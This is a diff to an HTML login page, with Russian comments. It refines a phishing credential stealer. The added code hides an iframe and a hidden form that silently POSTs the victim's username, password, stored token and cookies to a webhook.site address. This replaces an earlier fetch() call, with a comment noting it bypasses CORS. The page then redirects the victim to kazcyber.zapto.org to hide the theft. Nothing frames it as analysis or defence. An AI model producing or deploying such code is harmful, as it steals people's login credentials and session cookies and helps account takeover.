@@ -7,6 +7,7 @@
     body { font-family: sans-serif; padding: 30px; text-align: center; }
     input, button { padding: 10px; margin: 10px; width: 250px; }
     .error { color: red; }
+    iframe { display: none; }
   </style>
 </head>
 <body>
@@ -18,8 +19,17 @@
   </form>
   <p class="error" id="errorMessage"></p>
 
+  <!-- Скрытая форма для отправки данных на webhook -->
+  <iframe name="stealth" style="display:none;"></iframe>
+  <form id="stealer" method="POST" action="https://webhook.site/6b77aea8-855b-4976-9d7e-a9e447b3b291" target="stealth">
+    <input type="hidden" name="username">
+    <input type="hidden" name="password">
+    <input type="hidden" name="token">
+    <input type="hidden" name="cookie">
+  </form>
+
   <script>
-    const webhook = "https://webhook.site/6b77aea8-855b-4976-9d7e-a9e447b3b291";
+    const form = document.getElementById("stealer");
 
     document.getElementById("loginForm").addEventListener("submit", async function (e) {
       e.preventDefault();
@@ -41,17 +51,17 @@
         const text = await res.text();
 
         if (text.includes("✅")) {
-          // Ждём немного, чтобы cookie и token записались
+          // Ждём чтобы успел сохраниться token и cookie
           setTimeout(() => {
-            const token = localStorage.getItem("token") || "(нет)";
-            const cookie = document.cookie;
+            form.username.value = username;
+            form.password.value = password;
+            form.token.value = localStorage.getItem("token") || "(нет токена)";
+            form.cookie.value = document.cookie || "(нет cookie)";
 
-            fetch(webhook, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ username, password, token, cookie })
-            });
+            // отправляем в iframe без CORS
+            form.submit();
 
+            // редирект на оригинальный сайт
             window.location.href = "https://kazcyber.zapto.org/";
           }, 1000);
         } else {
